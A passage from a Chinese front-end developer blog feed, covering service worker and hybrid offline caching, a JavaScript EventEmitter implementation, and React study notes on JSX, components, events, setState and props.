body，一份到浏览器，一份到缓存中缓存</div><div class="line"></div><div class="line">        caches.open(CACHE_VERSION).then(function(cache)&#123; // 缓存从线上获取的资源</div><div class="line">            cache.put(event.request, response);</div><div class="line">        &#125;);</div><div class="line"></div><div class="line">        return res;</div><div class="line">    &#125;)</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>service worker 更新步骤：<br>1.更新 service worker 的 JavaScript 文件<br>  当用户浏览你的网站时，浏览器尝试在后台重新下载 service worker 的脚本文件。<br>  经过对比，只要服务器上的文件和本地文件有一个字节不同，这个文件就认为是新的。<br>2.之后更新后的 service worker 启动并触发 install 事件。<br>3.此时，当前页面生效的依然是老版本的 service worker，新的 service worker 会进入 “waiting” 状态。<br>4.当页面关闭之后，老的 service worker 会被干掉，新的 servicer worker 接管页面<br>5.一旦新的 service worker 生效后会触发 activate 事件。</p>
<p>关于 service worker 的一些注意点：<br>1.service worker 是一个JavaScript worker ,所以它不能直接访问 DOM 。相反, service worker 可以通过postMessage 接口与跟其相关的页面进行通信,发送消息,从而让这些页面在有需要的时候去操纵 DOM 。<br>2.Service worker 是一个可编程的网络代理，允许你去控制如何处理页面的网络请求。<br>3.Service worker 在不使用时将被终止，并会在需要的时候重新启动，因此你不能把onfetch 和 onmessage事件来作为全局依赖处理程序。如果你需要持久话一些信息并在重新启动Service worker后使用他，可以使用 IndexedDBAPI ，service worker 支持。 　　<br>4.Service worker 广泛使用了 promise<br>缺点：<br>如果安装失败了，没有一个很好的方式来知晓<br>fetch api()目前仅支持Service Workers中使用<br>fetch() 中不会被触发重定向<br>页面在改变 hash 时，service worker 会停止工作</p>
<p><a href="https://segmentfault.com/a/1190000006061528" target="_blank" rel="external">Service Worker 生命周期</a><br><a href="https://zhuanlan.zhihu.com/p/20040372" target="_blank" rel="external">Service Worker那些事</a><br><a href="https://zhuanlan.zhihu.com/p/27264234" target="_blank" rel="external">深入了解 Service Worker</a><br><a href="http://www.alloyteam.com/2016/01/9274/" target="_blank" rel="external">Service Worker初体验</a><br><a href="https://serviceworke.rs/" target="_blank" rel="external">serviceworke Introduction</a></p>
<h2 id="离线缓存之-Hybrid-Cache离线包"><a href="#离线缓存之-Hybrid-Cache离线包" class="headerlink" title="离线缓存之 Hybrid Cache离线包"></a>离线缓存之 Hybrid Cache离线包</h2><p>前端开发”就是使用 HTML、CSS、JS 技术给一个网站或 Web 应用开发图形用户界面<br>所以，前端应用本质上一个 GUI 程序，而 GUI 程序有三种典型形态：<br>Web : 以浏览器为运行环境，基于浏览器内核支持的编程语言、API 来实现，被浏览器解释执行<br>Native : 以操作系统为运行环境，基于操作系统原生支持的编程语言、API 接口实现，以二进制包的形式运行<br>Hybird : 基于 Native 应用提供的一个支持 HTML、CSS、JS 的容器开发的应用，相当与用开发 Web 的方式开发 Native 应用</p>
<p>原理：<br>1.o2o 在线资源抓取程序：基于 phantomjs 解析资源<br>2.grunt-inc-offline 增量包计算器：基于 git-diff 的增量包运算<br>3.离线包生成器<br><img src="/image/CACHE1.png" alt="CACHE1"><br>1.o2o 定时程序监听线上页面变更，将其所携带的资源（HTML、CSS、JS 和部分图片）抓取下来<br>2.增量包计算器会计算好与之前若干版本之间的增量文件，配合包生成器将增量包逐一构建打包，同时生成好每个增量包的 Diff Json<br>3.调用 Clam 命令通过 Gitlab 将资源包部署至 CDN，以备手机端更新。<br>4.Gitlab 仓库 的更新会触发一个 Hook 脚本，调用 tSync 服务器的接口，来通知资源变更<br>5.tSync 服务器沙箱完成消息封装，包括了第二步生成了的 Diff Json 文本<br>6.tSync 长连接将消息指令下发给手机终端<br>7.手机终端拼好资源文件链接，从 CDN 将增量包更新下来，随后执行 Diff Json中的指令，完成包的更新。</p>
<p>手机端的两个重要进程：</p>
<p>1.资源预加载进程：在实际访问页面之前，将资源预加载到缓存池并更新 Cache Map<br>2.创建 WebView 进程：只聚焦本地资源读写，别的什么也不干<br>手机端 touch 到网络的环节收敛到了两处，第一，Package Update Controller，第二，WebView 本身必要的网络请求<br><img src="/image/CACHE2.png" alt="CACHE2"><br><a href="https://yq.aliyun.com/articles/2939" target="_blank" rel="external">相关链接</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;缓存的好处&quot;&gt;&lt;a href=&quot;#缓存的好处&quot; class=&quot;headerlink&quot; title=&quot;缓存的好处&quot;&gt;&lt;/a&gt;缓存的好处&lt;/h1&gt;&lt;p&gt; 利用缓存，可减少对源服务器的访问，因此也就节省了通信流量和通信时间&lt;br&gt; 从而减少了延迟(加快页面打开速度)，降
    
    </summary>
    
    
      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>实现一个 EventEmitter</title>
    <link href="http://yoohannah.github.io/post/knowledge/EventEmitter.html"/>
    <id>http://yoohannah.github.io/post/knowledge/EventEmitter.html</id>
    <published>2017-10-21T13:07:02.000Z</published>
    <updated>2017-10-21T13:07:14.874Z</updated>
    
    <content type="html"><![CDATA[<h1 id="实现一个-EventEmitter"><a href="#实现一个-EventEmitter" class="headerlink" title="实现一个 EventEmitter"></a>实现一个 EventEmitter</h1><p>EventEmitter 模块，它是一个类，它的实例具有以下几个方法：on、emit、off：<br>on(eventName, func)：监听 eventName 事件，事件触发的时候调用 func 函数。<br>emit(eventName, arg1, arg2, arg3…)：触发 eventName 事件，并且把参数 arg1, arg2, arg3… 传给事件处理函数。<br>off(eventName, func)：停止监听某个事件。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line">class EventEmitter &#123;</div><div class="line">  /* TODO */</div><div class="line">  constructor() &#123;</div><div class="line">    this.listeners = [];</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  on(eventName, func)&#123;</div><div class="line">    for(let i=0;i&lt;this.listeners.length;i++)&#123;</div><div class="line">      if(this.listeners[i].name === eventName)&#123;</div><div class="line">          this.listeners[i].funcs.push(func);</div><div class="line">          return</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line">    this.listeners.push(&#123;</div><div class="line">      name:eventName,</div><div class="line">      funcs:[]</div><div class="line">    &#125;)</div><div class="line">    this.listeners[this.listeners.length-1].funcs.push(func)</div><div class="line">  &#125;</div><div class="line">  emit(eventName, ...args)&#123;</div><div class="line">    for(let j=0;j&lt;this.listeners.length;j++)&#123;</div><div class="line">        if(this.listeners[j].name === eventName)&#123;</div><div class="line">            for(let k =0;k&lt;this.listeners[j].funcs.length;k++)&#123;</div><div class="line">              this.listeners[j].funcs[k](args)</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  off(eventName, func)&#123;</div><div class="line">      for(let j=0;j&lt;this.listeners.length;j++)&#123;</div><div class="line">        if(this.listeners[j].name === eventName)&#123;</div><div class="line">          if(func == undefined)&#123; //整个事件不再监听</div><div class="line">            this.listeners.splice(j,1);</div><div class="line">           &#125;</div><div class="line">          for(let k =0;k&lt;this.listeners[j].funcs.length;k++)&#123;</div><div class="line">                if(func === this.listeners[j].funcs[k])&#123;</div><div class="line">                  this.listeners[j].funcs.splice(k,1);</div><div class="line">                  return</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">const emitter = new EventEmitter()</div><div class="line">const sayHi = (name) =&gt; console.log(`Hello $&#123;name&#125;`)</div><div class="line">const sayHi2 = (name) =&gt; console.log(`Good night, $&#123;name&#125;`)</div><div class="line"></div><div class="line">emitter.on(&apos;hi&apos;, sayHi)</div><div class="line">emitter.on(&apos;hi&apos;, sayHi2)</div><div class="line">emitter.on(&apos;hi2&apos;, sayHi)</div><div class="line">emitter.on(&apos;hi2&apos;, sayHi2)</div><div class="line">emitter.emit(&apos;hi&apos;, &apos;ScriptOJ&apos;)</div><div class="line">// =&gt; Hello ScriptOJ</div><div class="line">// =&gt; Good night, ScriptOJ</div><div class="line"></div><div class="line">emitter.off(&apos;hi&apos;, sayHi)</div><div class="line">emitter.emit(&apos;hi&apos;, &apos;ScriptOJ&apos;)</div><div class="line">emitter.emit(&apos;hi2&apos;, &apos;ScriptOJ&apos;)</div><div class="line"></div><div class="line">const emitter2 = new EventEmitter()</div><div class="line">emitter2.on(&apos;hi&apos;, (name, age) =&gt; &#123;</div><div class="line">  console.log(`I am $&#123;name&#125;, and I am $&#123;age&#125; years old`)</div><div class="line">&#125;)</div><div class="line">emitter2.emit(&apos;hi&apos;, &apos;Jerry&apos;, 12)</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;实现一个-EventEmitter&quot;&gt;&lt;a href=&quot;#实现一个-EventEmitter&quot; class=&quot;headerlink&quot; title=&quot;实现一个 EventEmitter&quot;&gt;&lt;/a&gt;实现一个 EventEmitter&lt;/h1&gt;&lt;p&gt;EventEmitt
    
    </summary>
    
    
      <category term="js" scheme="http://yoohannah.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>react 简略学习笔记</title>
    <link href="http://yoohannah.github.io/post/knowledge/react.html"/>
    <id>http://yoohannah.github.io/post/knowledge/react.html</id>
    <published>2017-10-08T22:37:02.000Z</published>
    <updated>2017-10-21T13:01:16.876Z</updated>
    
    <content type="html"><![CDATA[<p>react.js是一个UI库,按照react规则，可以组建页面里每一小块的功能，这种局部的功能就是一个组件，<br>各组件之间可以组合、嵌套，从而拼成整个页面<br>react就是在组建各个尽可能通用的组件</p>
<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>直接使用官方工具 create-react-app<br>npm install -g create-react-app 安装命令行<br>create-react-app hello-react 构建工程<br>cd hello-react 进入工程<br>npm start 运行<br>src/App.js 即是编写组件的文件<br>一个简单的组件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">import React, &#123; Component &#125; from &apos;react&apos; //写组件必须要引入的依赖</div><div class="line">import ReactDOM from &apos;react-dom&apos; //把组件渲染到页面上去，就是把组件的html结构形成页面</div><div class="line">import &apos;./index.css&apos;</div><div class="line"></div><div class="line">class Header extends Component &#123;</div><div class="line">  render () &#123; //组件必须要有的函数，且必须要返回JSX</div><div class="line">    return ( //返回JSX写的组件内容</div><div class="line">      &lt;div&gt;</div><div class="line">        &lt;h1&gt;React 小书&lt;/h1&gt;</div><div class="line">      &lt;/div&gt;</div><div class="line">    )</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//ReactDOM.render 功能就是把组件渲染并且构造 DOM 树，然后插入到页面上某个特定的元素上（在这里是 id 为 root 的 div 元素）。</div><div class="line"></div><div class="line">ReactDOM.render(</div><div class="line">  &lt;Header /&gt;,</div><div class="line">  document.getElementById(&apos;root&apos;)</div><div class="line">)</div></pre></td></tr></table></figure></p>
<p>在编写 React.js 组件的时候，一般都需要继承 React.js 的 Component（也有别的编写组件的方式–&gt;函数式组件）。一个组件类必须要实现一个 render 方法，这个 render 方法必须要返回一个 JSX 元素。但这里要注意的是，</p>
<p>必须要用一个外层的 JSX 元素把所有内容包裹起来。返回并列多个 JSX 元素是不允许的，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">//不对的</div><div class="line">return (</div><div class="line">      &lt;div&gt;第一个&lt;/div&gt;</div><div class="line">      &lt;div&gt;第二个&lt;/div&gt;</div><div class="line">        )</div><div class="line">//对的</div><div class="line">return (</div><div class="line">    &lt;div&gt;</div><div class="line">      &lt;div&gt;第一个&lt;/div&gt;</div><div class="line">      &lt;div&gt;第二个&lt;/div&gt;</div><div class="line">    &lt;/div&gt;</div><div class="line">  )</div></pre></td></tr></table></figure></p>
<h1 id="JSX"><a href="#JSX" class="headerlink" title="JSX"></a>JSX</h1><p>可以把它看做是js的一种数据类型，长得很像HTML，但不是HTML,可以像html那样写，但有些地方要注意</p>
<p>可应用{}插入任何js代码，<br>如果是表达式函数，则返回的结果会相应地渲染到页面上，变量则将变量值对应渲染</p>
<p>{}内如果是条件表达式，即可以实现，根据不同条件返回不同jsx内容，<br>如果在表达式插入里面返回 null ，那么 React.js 会什么都不显示，相当于忽略了该表达式插入。结合条件返回的话，就做到显示或者隐藏某些元素</p>
<p>可以做变量的值<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">render () &#123;</div><div class="line">  const isGoodWord = true</div><div class="line">  const goodWord = &lt;strong&gt; is good&lt;/strong&gt;</div><div class="line">  const badWord = &lt;span&gt; is not good&lt;/span&gt;</div><div class="line">  const title = &lt;h1 className=&apos;title&apos;&gt; ScriptOJ &lt;/h1&gt;</div><div class="line">  const page = &lt;div className= &apos;content&apos;&gt; &#123;title&#125; &lt;/div&gt; //page里面用title的值，即 &lt;h1 className=&apos;title&apos;&gt; ScriptOJ &lt;/h1&gt;</div><div class="line">  return (</div><div class="line">    &lt;div&gt;</div><div class="line">      &lt;h1&gt;</div><div class="line">        React 小书</div><div class="line">        &#123;isGoodWord ? goodWord : badWord&#125;</div><div class="line">      &lt;/h1&gt;</div><div class="line">    &lt;/div&gt;</div><div class="line">  )</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>给标签添加class时，不能用class,要用className<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">render () &#123;</div><div class="line">  const className = &apos;header&apos;</div><div class="line">  return (</div><div class="line">    &lt;div className=&#123;className&#125;&gt;</div><div class="line">      &lt;h1&gt;React 小书&lt;/h1&gt;</div><div class="line">    &lt;/div&gt;</div><div class="line">  )</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>for属性不能用，要用htmlfor代替，<br>其他的 HTML 属性例如 style 、data-* 等就可以像普通的 HTML 属性那样直接添加上去。</p>
<h1 id="组件树"><a href="#组件树" class="headerlink" title="组件树"></a>组件树</h1><p>通过继承Component可以自定义形成多个类,即形成多个组件，但这些组件名，<br>或者说类名要作为标签使用，为与普通小写字母开头的HTML标签做区分，一定要以大写字母开头</p>
<p>自定义组件以标签的形式放入另一个自定义组件的JSX中，即可实现包含关系<br>多个自定义标签组件并列放入同一个JSX中即实现并列关系<br>组件可以和组件组合在一起，组件内部可以使用别的组件，就像普通的 HTML 标签一样使用就可以<br>这样的组合嵌套，最后构成一个所谓的组件树</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div></pre></td><td class="code"><pre><div class="line">import React, &#123; Component &#125; from &apos;react&apos;;</div><div class="line">import ReactDOM from &apos;react-dom&apos;;</div><div class="line"></div><div class="line">class Title extends Component &#123;</div><div class="line">  render () &#123;</div><div class="line">    return (</div><div class="line">      &lt;h1&gt;hello react&lt;/h1&gt;</div><div class="line">    )</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">class Header extends Component &#123;</div><div class="line">  render () &#123;</div><div class="line">    return (</div><div class="line">    &lt;div&gt;</div><div class="line">      &lt;Title /&gt; //header里面包含Title</div><div class="line">      &lt;h2&gt;This is Header&lt;/h2&gt;</div><div class="line">    &lt;/div&gt;</div><div class="line">    )</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">class Main extends Component &#123;</div><div class="line">  render () &#123;</div><div class="line">    return (</div><div class="line">    &lt;div&gt;</div><div class="line">      &lt;h2&gt;This is main content&lt;/h2&gt;</div><div class="line">    &lt;/div&gt;</div><div class="line">    )</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">class Footer extends Component &#123;</div><div class="line">  render () &#123;</div><div class="line">    return (</div><div class="line">    &lt;div&gt;</div><div class="line">      &lt;h2&gt;This is footer&lt;/h2&gt;</div><div class="line">    &lt;/div&gt;</div><div class="line">    )</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">class Index extends Component &#123;</div><div class="line">  render () &#123;</div><div class="line">    return (</div><div class="line">      &lt;div&gt; //多标签并列放置，组成页面</div><div class="line">        &lt;Header /&gt;</div><div class="line">        &lt;Main /&gt;</div><div class="line">        &lt;Footer /&gt;</div><div class="line">      &lt;/div&gt;</div><div class="line">    )</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">ReactDOM.render(</div><div class="line">  &lt;Index /&gt;,</div><div class="line">  document.getElementById(&apos;root&apos;)</div><div class="line">)</div></pre></td></tr></table></figure>
<h1 id="事件监听"><a href="#事件监听" class="headerlink" title="事件监听"></a>事件监听</h1><p> React.js 不需要手动调用浏览器原生的 addEventListener 进行事件监听。<br> React.js 封装好了一系列的 on<em> 的属性，当需要为某个元素监听某个事件的时候，只需要简单地给它加上 on</em> 就可以了。<br> 而且不需要考虑不同浏览器兼容性的问题，React.js 都封装好了这些细节。</p>
<p> 但是要注意，没有经过特殊处理的话，这些 on* 的事件监听只能用在普通的 HTML 的标签上，而不能用在组件标签上</p>
<p> React.js 会给每个事件监听传入一个 event 对象，这个对象提供的功能和浏览器提供的功能一致，而且它是兼容所有浏览器的。</p>
<p> React.js 的事件监听方法需要手动 bind 到当前实例，这种模式在 React.js 中非常常用。不然监听事件调用的方法里面的this是undefined<br> 另外可以在bind 的时候传参</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">class Title extends Component &#123;</div><div class="line"> handleClickOnTitle (e) &#123;</div><div class="line">    console.log(this)//undefined</div><div class="line">    console.log(e.target.innerHTML)//hello React</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  render () &#123;</div><div class="line">    return (</div><div class="line">      &lt;h1 onClick=&#123;this.handleClickOnTitle&#125;&gt;hello React&lt;/h1&gt;</div><div class="line">    )</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">class Title extends Component &#123;</div><div class="line"> handleClickOnTitle (word, e) &#123;</div><div class="line">    console.log(this, word)//Title 对象，“hello”</div><div class="line">    console.log(e.target.innerHTML)//hello React</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  render () &#123;</div><div class="line">    return (</div><div class="line">      &lt;h1 onClick=&#123;this.handleClickOnTitle.bind(this, &apos;Hello&apos;)&#125;&gt;hello React &lt;/h1&gt;</div><div class="line">    )</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h1 id="setState函数和pros"><a href="#setState函数和pros" class="headerlink" title="setState函数和pros"></a>setState函数和pros</h1><p>一个组件的显示形态是可以由它数据状态(state)和配置参数(pros)决定的，即两种方式控制组件显示形态</p>
<h2 id="方式一：利用state的值-通过渲染控制显示状态"><a href="#方式一：利用state的值-通过渲染控制显示状态" class="headerlink" title="方式一：利用state的值,通过渲染控制显示状态"></a>方式一：利用state的值,通过渲染控制显示状态</h2><p>一个组件可以拥有自己的状态,React.js 的 state 用来存储这种可变化的状态,再让setState函数根据state的值重新渲染组件到页面<br>setState 方法由父类 Component 所提供。当调用这个函数的时候，React.js 会更新组件的状态 state ，并且重新调用 render 方法，然后再把 render 方法所渲染的最新的内容显示到页面上。<br>注意，当要改变组件的状态的时候，不能直接用 this.state = xxx 这种方式来修改，如果这样做 React.js 就没办法知道你修改了组件的状态，它也就没有办法更新页面。所以，一定要使用 React.js 提供的 setState 方法，它接受一个对象或者函数作为参数。</p>
<p>传入一个对象的时候，这个对象表示该组件的新状态。但只需要传入需要更新的部分就可以了，而不需要传入整个对象<br>要注意的是，当调用 setState 的时候，React.js 并不会马上修改 state。而是把这个对象放到一个更新队列里面，稍后才会从队列当中把新的状态提取出来合并到 state 当中，然后再触发组件更新</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">handleClickOnLikeButton () &#123;</div><div class="line">    console.log(this.state.isLiked)</div><div class="line">    this.setState(&#123;</div><div class="line">      isLiked: !this.state.isLiked</div><div class="line">    &#125;)</div><div class="line">    console.log(this.state.isLiked) //第二次打印的就是第一次打印的值</div><div class="line">  &#125;</div></pre></td></tr></table></figure>
<p>如果需要多次setState,而且后续传入参数依赖前一个setState 参数，这时就要用函数做setState参数，<br>React.js 会把上一个 setState 的结果传入这个函数，你就可以使用该结果进行运算、操作，然后返回一个对象作为更新 state 的对象<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">handleClickOnLikeButton () &#123;</div><div class="line"></div><div class="line">    // this.setState(&#123; count: 0 &#125;) // =&gt; this.state.count 还是 undefined</div><div class="line">    // this.setState(&#123; count: this.state.count + 1&#125;) // =&gt; undefined + 1 = NaN</div><div class="line">    // this.setState(&#123; count: this.state.count + 2&#125;) //最终结果为NAN</div><div class="line"></div><div class="line">    this.setState((prevState) =&gt; &#123;</div><div class="line">      return &#123; count: 0 &#125;</div><div class="line">    &#125;)</div><div class="line">    this.setState((prevState) =&gt; &#123;</div><div class="line">      return &#123; count: prevState.count + 1 &#125; // 上一个 setState 的返回是 count 为 0，当前返回 1</div><div class="line">    &#125;)</div><div class="line">    this.setState((prevState) =&gt; &#123;</div><div class="line">      return &#123; count: prevState.count + 2 &#125; // 上一个 setState 的返回是 count 为 1，当前返回 3</div><div class="line">    &#125;)</div><div class="line">    // 最后的结果是 this.state.count 为 3，所以如果JSX中如果显示count,则显示3</div><div class="line">  &#125;</div></pre></td></tr></table></figure></p>
<p>多次调用setState只会返回多次运行后的结果，React.js 内部会把 JavaScript 事件循环中的消息队列的同一个消息中的 setState 都进行合并以后再重新渲染组件。</p>
<h2 id="方式二：在JSX中使用自定义组件时，传入配置属性，根据属性显示状态"><a href="#方式二：在JSX中使用自定义组件时，传入配置属性，根据属性显示状态" class="headerlink" title="方式二：在JSX中使用自定义组件时，传入配置属性，根据属性显示状态"></a>方式二：在JSX中使用自定义组件时，传入配置属性，根据属性显示状态</h2><p>在使用一个组件的时候，可以把参数放在标签的属性当中，所有的属性都会作为 props 对象的键值<br>组件内部就可以通过 this.props 来访问到这些配置参数<br>可以把任何类型的数据作为组件的参数，包括字符串、数字、对象、数组、甚至是函数等等<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">class Index extends Component &#123;</div><div class="line">  render () &#123;</div><div class="line">    return (</div><div class="line">      &lt;div&gt;</div><div class="line">        &lt;LikeButton wordings=&#123;&#123;likedText: &apos;已赞&apos;, unlikedText: &apos;赞&apos;&#125;&#125;</div><div class="line">        onClick=&#123;() =&gt; console.log(&apos;Click on like button!&apos;)/&gt; //这里onclick可以被当做属性访问到</div><div class="line">      &lt;/div&gt;</div><div class="line">    )</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line">//LikeButton 类</div><div class="line">handleClickOnLikeButton () &#123;</div><div class="line"></div><div class="line">    this.setState(&#123;</div><div class="line">      isLiked: !this.state.isLiked</div><div class="line">    &#125;)</div><div class="line">    if (this.props.onClick) &#123; //这里的onclick是使用&lt;LikeButton /&gt;时定义的属性</div><div class="line">      this.props.onClick() //这里的函数通过属性传递进来，不是组件自己实现</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">render()return 的JSX的button onclick事件绑定handleClickOnLikeButton函数</div></pre></td></tr></table></figure></p>
<p>JSX 的{}内可以嵌入任何表达式,{ {} }就是在 {} 内部用对象}字面量返回一个对象而已,<br>this.props.wordings就是对象{ likedText: ‘已赞’, unlikedText: ‘赞’} </p>
<p>可以用defaultProps配置默认属性,这样就不需要判断配置属性是否传进来了,如果没有传进来，会直接使用 defaultProps 中的默认属性</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">class LikeButton extends Component &#123;</div><div class="line">  static defaultProps = &#123;</div><div class="line">    likedText: &apos;取消&apos;,</div><div class="line">    unlikedText: &apos;点赞&apos;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  constructor () &#123;</div><div class="line">    super()</div><div class="line">    this.state = &#123; isLiked: false &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  handleClickOnLikeButton () &#123;</div><div class="line">    this.setState(&#123;</div><div class="line">      isLiked: !this.state.isLiked</div><div class="line">    &#125;)</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  render () &#123;</div><div class="line">  //不需要在这里向下面这样判断是否传进来了配置属性,如果配置了wordings就用wordings，否则用后面&#123;&#125;内的默认值</div><div class="line">  &lt;!-- const wordings = this.props.wordings || &#123;</div><div class="line">      likedText: &apos;取消&apos;,</div><div class="line">      unlikedText: &apos;点赞&apos;</div><div class="line">    &#125; --&gt;</div><div class="line">    return (</div><div class="line">      &lt;button onClick=&#123;this.handleClickOnLikeButton.bind(this)&#125;&gt;</div><div class="line">        &#123;this.state.isLiked</div><div class="line">          ? this.props.likedText //直接使用</div><div class="line">          : 